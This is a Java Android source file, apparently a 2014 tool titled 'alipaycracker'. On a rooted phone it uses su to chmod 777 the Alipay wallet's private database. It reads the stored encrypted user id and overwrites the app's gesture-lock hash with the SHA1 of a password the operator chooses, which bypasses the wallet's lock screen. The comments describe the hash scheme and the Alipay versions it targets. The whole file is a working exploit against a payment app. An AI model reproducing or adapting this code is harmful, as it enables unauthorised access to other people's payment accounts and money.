/*
 * 未加密的手势密码  与 加密后(des)的user id拼接，然后把拼接后的字符串用sha1加密,即为gesturePwd；
 * 事实上Des.java没有用到，因为修改密码不需要解密user id；
 * 这个程序运行的时候，切换到别的进程之后再切换回来，进程的root权限就已经丢失了，这个时候再修改密码是不行的，必须重新进入。
 * 需要配合支付宝8.1或更低版本使用。测试版本用的是8.1.0.043001
 * Larry 2014
 */
package com.larry.alipaycracker;

import jackpal.androidterm.Exec;

import java.io.FileDescriptor;
import java.io.FileOutputStream;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

	String szUerIdString;
	TextView tvStatus;
	EditText etEncryptUserid;
	EditText etMyPwd;
	Button btnOK;
	
	final int[] processId = new int[1];
	final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-",
			null, processId);

	final FileOutputStream out = new FileOutputStream(fd);

	@SuppressLint("NewApi")
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		
		try{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		szUerIdString = "";
		tvStatus = (TextView) findViewById(R.id.textStatus);
		etEncryptUserid = (EditText) findViewById(R.id.editEncryptUserId);
		etMyPwd = (EditText) findViewById(R.id.editMyselfPwd);
		btnOK = (Button) findViewById(R.id.btnSetting);

		if (RootUtils.hasRoot() == 0) {
			tvStatus.setText("本程序只能在ROOT过的手机上运行！");
			return;
		}

		if (!isAppInstalled("com.eg.android.AlipayGphone")) {
			tvStatus.setText("请确认您已经安装了支付宝钱包！");
			return;
		}
		
		if(RootUtils.hasDB() == 0)
		{
			tvStatus.setText("没有DB");
			return;
		}

		String szUserId = getUserId();
//		String szUserId = "aa" ;
		if (!szUserId.isEmpty()) {

			szUerIdString = szUserId;
			etEncryptUserid.setText(szUserId);
			tvStatus.setText("读取user id成功，请输入自定义手势密码！");

//			String szDecryptUserid = Des.decrypt(szUserId, "userInfo");
//			if (!szDecryptUserid.isEmpty()) {
//				etDecryptUserid.setText(szDecryptUserid);
//			} else {
//				tvStatus.setText("解密user id失败！");
//			}

			btnOK.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					String szPwd = etMyPwd.getText().toString();
					if (szPwd.isEmpty()) {
						Toast.makeText(MainActivity.this,
								"设置的自定义密码不能为空，请重新输入！", Toast.LENGTH_LONG)
								.show();
					} else {
						StringBuilder sBuilder = new StringBuilder();
						sBuilder.append(szPwd);
						sBuilder.append(szUerIdString);

						String tmp = sBuilder.toString();
						String sha1 = SHA1.sha1(tmp);
						Log.v("TAG", sha1);

						if (!sha1.isEmpty()) {
							try {
								if (updateDatabaseGesturePwd(szUerIdString, sha1)) {
									tvStatus.setText("设置自定义密码成功！");
								} else {
									tvStatus.setText("设置自定义密码失败！");
								}
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}
				}
			});
		} else {
			tvStatus.setText("获取user id失败！");
		}
	}
	catch(Exception e)
	{
		e.printStackTrace();
		Log.e("HEY", "SOMETHING'S WRONG.");
	}
	}

	public boolean isAppInstalled(String uri) {
		PackageManager pm = getPackageManager();
		boolean installed = false;
		try {
			pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
			installed = true;
		} catch (PackageManager.NameNotFoundException e) {
			installed = false;
		}
		return installed;
	}

	// 获取加密的user id
	private String getUserId() throws Exception {
		String szRet = "";
		int USER_ID_INDEX = 4;

		// 修改数据库文件的读写权限
//		RootUtils
//				.runRootCommand("chmod 666 /data/data/com.eg.android.AlipayGphone/databases/alipayclient.db");
//		RootUtils
//				.runRootCommand("chmod 666 /data/data/com.eg.android.AlipayGphone/databases/alipayclient.db-journal");

		
		//By Larry 修改读写权限
		
		try {
			
			//run 「chmod 777 getroot」 and then run「getroot」immediately
			
			//question is , after runing this,how to start phase2 and copy su to system/bin? May 23,Larry
			
			String command = "su\n";//下面执行的时候也要用多个su？
			out.write(command.getBytes());
			out.flush();
			command = "chmod 777 /data/data/com.eg.android.AlipayGphone/databases/alipayclient.db\n";
			out.write(command.getBytes());
			out.flush();
			command = "su\n";//下面执行的时候也要用多个su？
			out.write(command.getBytes());
			out.flush();
			command = "chmod 777 /data/data/com.eg.android.AlipayGphone/databases/alipayclient.db-journal";
			out.write(command.getBytes());
			out.flush();
		} catch (Exception ex) {
			ex.printStackTrace();
			Log.e("chmod 777", ex.getMessage());
		}
		
		
		try {
			Context context = createPackageContext(
					"com.eg.android.AlipayGphone",
					Context.CONTEXT_IGNORE_SECURITY);
			
			String command = "su\n";
			out.write(command.getBytes());
			out.flush();
			
			SQLiteDatabase db = context.openOrCreateDatabase("alipayclient.db",
					0, null);
			Cursor cursor = db.rawQuery("select * from userinfo", null);
			if (cursor.moveToFirst()) {
				szRet = cursor.getString(USER_ID_INDEX);
			}
			db.close();
		} catch (NameNotFoundException e1) {
			e1.printStackTrace();
		}

		return szRet;
	}

	// 修改手势密码
	@SuppressLint("NewApi")
	private boolean updateDatabaseGesturePwd(String szUerId, String szPwd) throws Exception {
		boolean bRet = false;

		if (szPwd.isEmpty() || szUerId.isEmpty()) {
			return bRet;
		}

		try {
			Context context = createPackageContext(
					"com.eg.android.AlipayGphone",
					Context.CONTEXT_IGNORE_SECURITY);
			
			String command = "su\n";
			out.write(command.getBytes());
			out.flush();
			
			SQLiteDatabase db = context.openOrCreateDatabase("alipayclient.db",
					0, null);
			ContentValues cv = new ContentValues();
			cv.put("gesturePwd", szPwd);
			String[] args = { String.valueOf(szUerId) };
			int n = db.update("userinfo", cv, "userId=?", args);
			if (n > 0) {
				bRet = true;
			}
			db.close();
		} catch (NameNotFoundException e1) {
			e1.printStackTrace();
		}

		return bRet;
	}

}
